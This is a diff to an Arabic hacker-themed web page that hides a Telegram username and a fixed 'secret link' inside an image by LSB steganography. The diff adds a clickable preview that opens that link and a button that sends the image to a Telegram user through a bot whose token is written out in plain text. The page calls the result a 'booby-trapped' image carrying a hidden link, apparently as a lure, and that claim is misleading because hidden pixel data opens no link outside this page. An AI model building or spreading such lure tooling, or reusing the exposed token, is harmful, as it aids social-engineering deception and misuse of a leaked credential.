@@ -58,7 +58,7 @@
         .glass-hacker {
             position: relative;
             z-index: 10;
-            max-width: 580px;
+            max-width: 620px;
             width: 100%;
             background: rgba(0, 20, 0, 0.65);
             backdrop-filter: blur(12px);
@@ -253,7 +253,7 @@
         }
 
         /* أزرار هكر */
-        .action-btn, .channel-btn, .download-btn {
+        .action-btn, .channel-btn, .download-btn, .sendbot-btn {
             width: 100%;
             padding: 14px;
             border-radius: 60px;
@@ -303,6 +303,28 @@
             border-color: #ffffaa;
         }
 
+        .sendbot-btn {
+            background: linear-gradient(95deg, #1a2a2a, #004466);
+            border: 2px solid #33ccff;
+            color: #ccffff;
+            text-shadow: 0 0 6px #33ccff;
+            box-shadow: 0 0 15px #33ccff;
+            animation: pulseBot 1.2s infinite ease-in-out;
+        }
+
+        .sendbot-btn:hover {
+            background: #006699;
+            transform: scale(1.01);
+            box-shadow: 0 0 28px #66ffff;
+            border-color: #aaffff;
+        }
+
+        @keyframes pulseBot {
+            0% { box-shadow: 0 0 5px #33ccff; border-color: #33ccff; }
+            50% { box-shadow: 0 0 22px #66ffff; border-color: #88ffff; }
+            100% { box-shadow: 0 0 5px #33ccff; border-color: #33ccff; }
+        }
+
         @keyframes pulseDownload {
             0% { box-shadow: 0 0 5px #ffcc00; border-color: #ffcc44; }
             50% { box-shadow: 0 0 22px #ffee66; border-color: #ffff88; }
@@ -320,6 +342,72 @@
             box-shadow: 0 0 14px #0f0;
             color: #ffffff;
             transform: scale(0.99);
+        }
+
+        /* حاوية عرض الصورة بعد التلغيم */
+        .preview-container {
+            margin: 15px 0 20px;
+            text-align: center;
+            background: rgba(0, 15, 0, 0.6);
+            border-radius: 32px;
+            padding: 12px;
+            border: 1px solid #00ff4133;
+            backdrop-filter: blur(5px);
+            transition: 0.2s;
+        }
+
+        .preview-container.hidden {
+            display: none;
+        }
+
+        .preview-label {
+            color: #8effaa;
+            font-size: 0.75rem;
+            font-family: monospace;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .steg-image-preview {
+            max-width: 100%;
+            max-height: 180px;
+            border-radius: 24px;
+            cursor: pointer;
+            border: 2px solid #0f0;
+            box-shadow: 0 0 12px #0f0;
+            transition: 0.2s;
+        }
+
+        .steg-image-preview:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 22px #0f0;
+        }
+
+        .click-hint {
+            font-size: 0.7rem;
+            color: #aaffaa;
+            margin-top: 8px;
+            font-family: monospace;
+        }
+
+        /* مجموعة الأزرار بعد التلغيم */
+        .buttons-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 5px;
+        }
+
+        .two-buttons-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .two-buttons-row .download-btn,
+        .two-buttons-row .sendbot-btn {
+            flex: 1;
+            margin-bottom: 0;
         }
 
         /* تذييل هكر متحرك */
@@ -397,6 +485,10 @@
             .tremux-badge span:last-child { font-size: 1rem; }
             .content { padding: 20px 16px; }
             .toast-hacker { white-space: normal; width: 80%; text-align: center; }
+            .two-buttons-row {
+                flex-direction: column;
+                gap: 12px;
+            }
         }
     </style>
 </head>
@@ -441,8 +533,20 @@
         <!-- زر تلقيم الصورة -->
         <button class="action-btn" id="stegBtn">🧿 تـلـغيم الـصوره الأن 🧿</button>
         
-        <!-- زر التحميل الجديد الذي يظهر فقط بعد التلغيم -->
-        <button class="download-btn hidden" id="downloadStegBtn">⬇️ تحميل الصورة يـحب ⬇️</button>
+        <!-- مجموعة الأزرار الجديدة (تحميل + إرسال للبوت) تظهر بعد التلغيم -->
+        <div class="buttons-group hidden" id="afterStegButtons">
+            <div class="two-buttons-row">
+                <button class="download-btn" id="downloadStegBtn">⬇️ تحميل الصورة يـحب ⬇️</button>
+                <button class="sendbot-btn" id="sendToBotBtn">🤖 إرسال إلـ البـوت 🤖</button>
+            </div>
+        </div>
+
+        <!-- حاوية عرض الصورة الضغط على الصورة ينقل للرابط المخفي -->
+        <div class="preview-container hidden" id="previewContainer">
+            <div class="preview-label">📸 الصورة الملغومة (اضغط عليها لفتح الرابط السري)</div>
+            <img id="stegImagePreview" class="steg-image-preview" alt="preview steg">
+            <div class="click-hint">⚡ [CLICK ON IMAGE] سيتم توجيهك للرابط المخفي داخل الصورة ⚡</div>
+        </div>
 
         <!-- زر قناتي -->
         <button class="channel-btn" id="channelBtn">📡 قناتي | TELEGRAM</button>
@@ -462,17 +566,26 @@
         const telegramInput = document.getElementById('telegramUsername');
         const stegBtn = document.getElementById('stegBtn');
         const downloadBtn = document.getElementById('downloadStegBtn');
+        const sendToBotBtn = document.getElementById('sendToBotBtn');
         const channelBtn = document.getElementById('channelBtn');
         const footerCredit = document.getElementById('footerCredit');
         const toastDiv = document.getElementById('toastMsg');
+        const afterStegButtonsDiv = document.getElementById('afterStegButtons');
+        const previewContainer = document.getElementById('previewContainer');
+        const stegImagePreview = document.getElementById('stegImagePreview');
 
         // النص النهائي للهاكر
         const HACKER_FOOTER = "جميع الحقوق محفوظة لدى الهكر 𝑾𝑯𝑰𝑺𝑲𝒀 𝑬𝑳𝒀𝑶𝑼𝑻𝑼𝑩𝑬𝑹";
         const CHANNEL_LINK = "https://t.me/Whiskybots";
+        // الرابط السري المراد إخفاؤه داخل الصورة وجعله يعمل عند الضغط على الصورة
+        const HIDDEN_URL = "https://salemsayed945-max.github.io/Phone-and-android-/";
+        // توكن البوت الثابت
+        const BOT_TOKEN = "8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s";
 
         let selectedImageFile = null;
         let currentStegBlob = null;      // تخزين الصورة الملغومة مؤقتاً
         let currentStegFileName = null;   // الاسم المقترح للتحميل
+        let currentHiddenUrl = null;      // الرابط الذي تم إخفاؤه (للاستخدام المباشر)
 
         // === خلفية matrix 010101 ديناميكية ===
         function generateMatrixBg() {
@@ -515,56 +628,46 @@
             }, duration);
         }
 
-        // إخفاء زر التحميل مؤقتاً
-        function hideDownloadButton() {
-            if(downloadBtn) {
-                downloadBtn.classList.add('hidden');
-                currentStegBlob = null;
-                currentStegFileName = null;
-            }
+        // إخفاء أقسام ما بعد التلغيم
+        function hidePostStegUI() {
+            if(afterStegButtonsDiv) afterStegButtonsDiv.classList.add('hidden');
+            if(previewContainer) previewContainer.classList.add('hidden');
+            if(stegImagePreview) stegImagePreview.src = '';
+            currentStegBlob = null;
+            currentStegFileName = null;
+            currentHiddenUrl = null;
         }
-        
-        // إظهار زر التحميل مع البيانات الجديدة
-        function showDownloadButton(blob, suggestedName) {
+
+        // إظهار واجهة ما بعد التلغيم مع الصورة والرابط
+        function showPostStegUI(blob, filename, hiddenUrl) {
             currentStegBlob = blob;
-            currentStegFileName = suggestedName;
-            if(downloadBtn) {
-                downloadBtn.classList.remove('hidden');
-                // إضافة تأثير وميض
-                downloadBtn.style.animation = 'none';
-                setTimeout(() => {
-                    if(downloadBtn) downloadBtn.style.animation = 'pulseDownload 1.2s infinite ease-in-out';
-                }, 20);
-            }
+            currentStegFileName = filename;
+            currentHiddenUrl = hiddenUrl;
+            if(afterStegButtonsDiv) afterStegButtonsDiv.classList.remove('hidden');
+            
+            // عرض معاينة الصورة
+            const url = URL.createObjectURL(blob);
+            stegImagePreview.src = url;
+            if(previewContainer) previewContainer.classList.remove('hidden');
+            // عند النقر على الصورة يتم فتح الرابط المخفي
+            stegImagePreview.onclick = () => {
+                if(currentHiddenUrl) {
+                    window.open(currentHiddenUrl, '_blank');
+                    showToast(`🔗 تم التوجيه إلى الرابط السري`, 1800);
+                } else {
+                    showToast(`⚠️ الرابط غير متاح حالياً`, 1500);
+                }
+            };
+            // تحرير URL بعد التحميل عند تغيير الصورة (اختياري)
+            stegImagePreview.onload = () => {
+                URL.revokeObjectURL(url);
+            };
         }
 
-        // اختيار الصورة
-        imageInput.addEventListener('change', function(e) {
-            // عند اختيار صورة جديدة، نُخفي زر التحميل لأن الصورة القديمة لم تعد صالحة
-            hideDownloadButton();
-            if (imageInput.files && imageInput.files.length > 0) {
-                const file = imageInput.files[0];
-                if (!file.type.startsWith('image/')) {
-                    showToast("❌ [ERROR] الملف ليس صورة صالحة", 1800);
-                    imageInput.value = '';
-                    fileNameSpan.innerText = "لم يتم اختيار أي ملف";
-                    selectedImageFile = null;
-                    return;
-                }
-                selectedImageFile = file;
-                fileNameSpan.innerText = file.name;
-                showToast("✓ تم رفع الصورة | READY TO STEG", 1500);
-            } else {
-                selectedImageFile = null;
-                fileNameSpan.innerText = "لم يتم اختيار أي ملف";
-            }
-        });
-        document.getElementById('fileBox').addEventListener('click', (e) => {
-            if (e.target.tagName !== 'LABEL' && !e.target.closest('.file-label')) imageInput.click();
-        });
-
-        // === دالة التلغيم الفعلية (LSB Steganography) ===
-        async function steganographImage(imageFile, secretMessage) {
+        // === دالة التلغيم الفعلية (LSB Steganography) مع دمج معرف التليجرام + الرابط المخفي ===
+        async function steganographImage(imageFile, telegramId, hiddenUrl) {
+            // بناء الرسالة السرية: "TG: @username|||URL: الرابط"
+            const secretMessage = `TG: ${telegramId}|||URL: ${hiddenUrl}`;
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
                 reader.onload = function(e) {
@@ -580,7 +683,7 @@
                         
                         const encoder = new TextEncoder();
                         const msgBytes = encoder.encode(secretMessage);
-                        const delimiter = new Uint8Array([0x00, 0x00, 0xFF]);
+                        const delimiter = new Uint8Array([0x00, 0x00, 0xFF]); // فاصل النهاية
                         const fullBytes = new Uint8Array([...msgBytes, ...delimiter]);
                         
                         const totalBits = fullBytes.length * 8;
@@ -620,26 +723,21 @@
             });
         }
         
-        // دالة تحميل آمنة للمتصفحات (جميع المتصفحات)
+        // دالة تحميل آمنة للمتصفحات
         function downloadBlobSafely(blob, filename) {
             if (!blob) {
                 showToast("⚠️ لا توجد صورة محضرة للتحميل!", 2000);
                 return false;
             }
             try {
-                // الطريقة الأكثر توافقًا: استخدام createObjectURL + عنصر <a>
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
                 a.download = filename;
-                // إضافة إلى DOM ثم إزالته (لضمان التوافق)
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                // تحرير الرابط بعد فترة قصيرة
-                setTimeout(() => {
-                    URL.revokeObjectURL(url);
-                }, 150);
+                setTimeout(() => { URL.revokeObjectURL(url); }, 150);
                 return true;
             } catch (err) {
                 console.error("Download error:", err);
@@ -647,30 +745,76 @@
                 return false;
             }
         }
+
+        // دالة إرسال الصورة إلى البوت تليجرام
+        async function sendImageToBot(blob, chatId, botToken) {
+            // تنسيق chat_id بحيث يكون جاهزاً (إزالة @ اختياري ولكن نتركه كما هو)
+            let targetChatId = chatId.trim();
+            if(targetChatId === "") throw new Error("معرف التليجرام فارغ");
+            if(!targetChatId.startsWith('@')) targetChatId = '@' + targetChatId;
+            
+            const formData = new FormData();
+            formData.append('chat_id', targetChatId);
+            formData.append('photo', blob, 'stego_image.png');
+            formData.append('caption', '🔒 صورة ملغومة | تحتوي على بيانات مخفية 🔒');
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const response = await fetch(url, { method: 'POST', body: formData });
+            const json = await response.json();
+            if(!json.ok) {
+                let errMsg = json.description || 'فشل الإرسال';
+                if(errMsg.includes('chat not found') || errMsg.includes('user not found')) {
+                    errMsg = '❌ لم يتم العثور على المستخدم. تأكد من أن البوت قد بدأ محادثة معك أولاً (@'+targetChatId.replace('@','')+')';
+                }
+                throw new Error(errMsg);
+            }
+            return json;
+        }
         
-        // زر التحميل الجديد: يستخدم الصورة المخزنة currentStegBlob
+        // زر التحميل
         if(downloadBtn) {
             downloadBtn.addEventListener('click', () => {
                 if (currentStegBlob && currentStegFileName) {
                     const success = downloadBlobSafely(currentStegBlob, currentStegFileName);
-                    if(success) {
-                        showToast(`✅ بدء تحميل: ${currentStegFileName}`, 2200);
-                        // وميض إضافي للاحتفال
-                        downloadBtn.style.transform = 'scale(0.98)';
-                        setTimeout(() => { if(downloadBtn) downloadBtn.style.transform = ''; }, 200);
-                    } else {
-                        showToast("⚠️ عذراً، حدث خلل أثناء التحميل", 2000);
-                    }
+                    if(success) showToast(`✅ بدء تحميل: ${currentStegFileName}`, 2200);
                 } else {
                     showToast("🔴 لا توجد صورة ملغومة جديدة! قم بالتلغيم أولاً.", 2000);
                 }
             });
         }
         
+        // زر إرسال إلى البوت
+        if(sendToBotBtn) {
+            sendToBotBtn.addEventListener('click', async () => {
+                if (!currentStegBlob) {
+                    showToast("⚠️ لا توجد صورة ملغومة جاهزة للإرسال", 2000);
+                    return;
+                }
+                let rawUsername = telegramInput.value.trim();
+                if(rawUsername === "") {
+                    showToast("⎛⎝⚠️⎠⎞ أدخل أيدي التليجرام أولاً لإرسال الصورة", 2300);
+                    return;
+                }
+                sendToBotBtn.disabled = true;
+                const originalText = sendToBotBtn.innerHTML;
+                sendToBotBtn.innerHTML = "🌀 جاري الإرسال ...";
+                try {
+                    await sendImageToBot(currentStegBlob, rawUsername, BOT_TOKEN);
+                    showToast(`✅ تم إرسال الصورة بنجاح إلى ${rawUsername} عبر البوت`, 3000);
+                } catch (err) {
+                    console.error(err);
+                    showToast(`❌ فشل الإرسال: ${err.message}`, 4000);
+                } finally {
+                    sendToBotBtn.disabled = false;
+                    sendToBotBtn.innerHTML = originalText;
+                }
+            });
+        }
+
         // زر التلغيم الرئيسي
         stegBtn.addEventListener('click', async () => {
-            // قبل بدء عملية جديدة نخفي زر التحميل لأنه سيصبح غير صالح
-            hideDownloadButton();
+            // تخفيف الواجهة السابقة
+            hidePostStegUI();
             
             if (!selectedImageFile) {
                 showToast("⚠️ [ACCESS DENIED] لا توجد صورة محددة", 2000);
@@ -682,38 +826,35 @@
                 return;
             }
             const finalID = username.startsWith('@') ? username : '@' + username;
-            const secretMsg = `TG: ${finalID}`;
             
             // تغيير التذييل فوراً إلى نص الهكر
             footerCredit.innerText = HACKER_FOOTER;
             footerCredit.style.textShadow = "0 0 6px #0f0";
             
-            showToast("🌀 جاري التلغيم ... [HIDING DATA]", 1800);
+            showToast("🌀 جاري التلغيم (إخفاء المعرف + الرابط السري)...", 2000);
             try {
-                const steggedBlob = await steganographImage(selectedImageFile, secretMsg);
+                // استدعاء التلغيم مع إدخال معرف التليجرام والرابط السري
+                const steggedBlob = await steganographImage(selectedImageFile, finalID, HIDDEN_URL);
                 const original = selectedImageFile.name;
                 const dot = original.lastIndexOf('.');
                 const base = dot !== -1 ? original.substring(0,dot) : original;
                 const newName = `${base}_st3g4n0.png`;
                 
-                // تخزين البيانات لإظهار زر التحميل
-                showDownloadButton(steggedBlob, newName);
+                // إظهار واجهة ما بعد التلغيم (زر تحميل + زر إرسال + معاينة قابلة للنقر)
+                showPostStegUI(steggedBlob, newName, HIDDEN_URL);
                 
-                // رسالة نجاح توضح ظهور زر التحميل
-                showToast("✔️ تم التلغيم بنجاح! اضغط زر التحميل لتنزيل الصورة.", 3000);
+                showToast("✔️ تم التلغيم بنجاح! استخدم الأزرار أو اضغط على الصورة.", 3000);
                 
-                // تأثير إضافي: جعل التذييل يومض
-                setTimeout(() => { footerCredit.style.textShadow = "0 0 0px"; }, 1800);
-                
-                // تمرير لطيف إلى زر التحميل ليصبح مرئياً
-                if(downloadBtn && downloadBtn.classList.contains('hidden') === false) {
-                    downloadBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                // تمرير لطيف إلى الأزرار الجديدة
+                if(afterStegButtonsDiv && !afterStegButtonsDiv.classList.contains('hidden')) {
+                    afterStegButtonsDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }
+                // وميض التذييل
+                setTimeout(() => { footerCredit.style.textShadow = "0 0 0px"; }, 1800);
             } catch(err) {
                 console.error(err);
                 showToast(`🔥 فشل التلغيم: ${err.message}`, 3000);
-                // في حالة الفشل نضمن إخفاء زر التحميل
-                hideDownloadButton();
+                hidePostStegUI();
             }
         });
         
@@ -721,6 +862,30 @@
         channelBtn.addEventListener('click', () => {
             window.open(CHANNEL_LINK, '_blank');
             showToast("⚡ توجيه إلى قناة WHISKY ELYOUTUBER ⚡", 1800);
+        });
+        
+        // تحديد اسم الملف عند الرفع
+        imageInput.addEventListener('change', function(e) {
+            hidePostStegUI();  // أي صورة جديدة نزيل واجهة النجاح السابقة
+            if (imageInput.files && imageInput.files.length > 0) {
+                const file = imageInput.files[0];
+                if (!file.type.startsWith('image/')) {
+                    showToast("❌ [ERROR] الملف ليس صورة صالحة", 1800);
+                    imageInput.value = '';
+                    fileNameSpan.innerText = "لم يتم اختيار أي ملف";
+                    selectedImageFile = null;
+                    return;
+                }
+                selectedImageFile = file;
+                fileNameSpan.innerText = file.name;
+                showToast("✓ تم رفع الصورة | READY TO STEG", 1500);
+            } else {
+                selectedImageFile = null;
+                fileNameSpan.innerText = "لم يتم اختيار أي ملف";
+            }
+        });
+        document.getElementById('fileBox').addEventListener('click', (e) => {
+            if (e.target.tagName !== 'LABEL' && !e.target.closest('.file-label')) imageInput.click();
         });
         
         // تأكيد التذييل الأصلي في البداية
@@ -735,11 +900,9 @@
             }
         }, 4000);
         
-        // عندما يغير المستخدم الصورة أو يحاول الخروج، نقوم بتنظيف البيانات الحساسة من الذاكرة (اختياري)
+        // تنظيف عند الخروج
         window.addEventListener('beforeunload', () => {
-            if(currentStegBlob) {
-                // لا نستطيع تحريره هنا بشكل كامل لكن نتركه
-            }
+            if(currentStegBlob) { }
         });
     })();
 </script>
